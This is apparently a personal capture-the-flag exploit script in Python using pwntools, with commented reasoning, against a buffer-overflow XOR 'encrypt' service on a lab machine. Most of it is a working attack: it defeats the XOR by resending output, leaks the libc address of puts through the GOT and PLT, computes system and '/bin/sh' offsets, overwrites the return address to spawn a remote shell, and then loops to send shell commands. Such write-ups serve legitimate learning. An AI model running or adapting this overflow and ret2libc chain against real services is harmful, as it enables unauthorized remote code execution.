#This is probably the hardest I've worked on one of these but I also learned more than I have
#on any other single challenge. I'm also really proud I did it without using someone else's
#writeup.

#Here was my thought process as I went about this:

#First start by looking up all the functions I don't know super well
#nread: this seems to not been a standard c function, but if it has the same syntax
#as read(), it takes in a file descriptor, a buffer to write to, and a number of bytes to write.
#On closer inspection, nread will also call exit if there is nothing more to read.
#nwrite: same situtation as nread. Takes in a file descriptor, a buffer to read from
#and the number of bytes to read. 

#Figuring out the format to send data in was awful as it was not possible from a simple netcat

#The vulnerability is clearly that we can write 2^32 bytes into the buffer if we so desire.
#However, to get that to do anything we need to break out of the loop so the function returns
#before exiting in either nread or the default switch case. This can be done by sending Q after our payload.
#Now we need to figure out how to deal with our payload getting XORed...
#Big breaktrough! keyed is a STATIC variable, which means that if we send in what we got out we will
#XOR against the same set of numbers, returning back to our original input!!!!!!
#Proof of concept, we input 10 A's and get back 10 A's
'''
r.send(b"E" + p32(10) + b"A" * 10)
r.recvline()
r.recvline()
xored = r.recv()[4:]
r.send(b"E" + p32(10) + xored) 
r.recv()
print(r.recv()[5:])
'''
#It is now ret2libc/ret2text/ROP time :) Too bad I don't know how to do that yet :(
#Many hours of research later...
#Plan: 
#Phase 1
#1. Leak an address of a function in libc
puts_got = 0x804b3b8 #Holds the value of the address to puts in libc
puts_plt = 0x8048930 #Calls puts
#   Stack: <puts_plt> <encrypt_file> <puts_got>
#   ^^^I can't describe how happy I was when I got this step to work.
#2. Find the offset between puts and main and use that to get to system and /bin/sh
libc_main = None #Equal to whatever we get out from (1) - libc_puts_offset
#  Found using $(objdump -d "the libc file" | less) and searching
libc_puts_offset = 394160
libc_system_offset = 248608
libc_binsh_offset = 1280218
#Phase 2
#1. Call encrypt again, we actually have to do this in Phase 1 step 1 but this is in the order everything gets called.
encrypt_file = 0x80497f7 #Address to the start of encrypt file... 
#2. Call system("/bin/sh")
#   Stack: <libc_main + libc_system_offset> <AAAA> <libc_main + libc_binsh_offset>
from pwn import *

port = 20002
addr = "192.168.56.103"

buffer_sz = 32 * 4096
r = remote(addr, port)

#Phase 1
r.send(b"E" + p32(buffer_sz + 28) + b"A" * (buffer_sz + 16) + p32(puts_plt) + p32(encrypt_file) + p32(puts_got))
#Get the messages it prints
r.recvline()
r.recvline()
#Get our "encrypted" output
xored = r.recvn(buffer_sz+28+4)[4:]
#Send the "encrypted" payload back to make it unencrypted and Q to make function return.
r.send(b"E" + p32(len(xored)) + xored + b"Q") 
#Recieve the doubly XORed output
r.recv()
r.recvn(len(xored) + 5)
#We have now leaked the address for puts
puts = u32(r.recv()[:4])
#Use it to calculate everything else
libc_main = puts - libc_puts_offset
system = libc_main + libc_system_offset
binsh = libc_main + libc_binsh_offset
#Phase 2
r.send(b"E" + p32(buffer_sz + 28) + b"B" * (buffer_sz + 16) + p32(system) + p32(0xdeadbeef) + p32(binsh))
r.recvline()
xored = r.recvn(buffer_sz+28+4)[4:]
r.send(b"E" + p32(len(xored)) + xored + b"Q")
#Recieve all the doubly XORed output
r.recvn(len(xored) + 5)
r.recv()
#Use the shell :)
#I figured out that I can't use interactive because it takes in \r which is what windows uses instead 
#of the line feed character.
log.info("Successfully pwned :)")
while True:
    a = input("pwned@pwned:~$ ")
    if a == "Q":
        break
    r.send(a + "\n")
    print(r.recv())
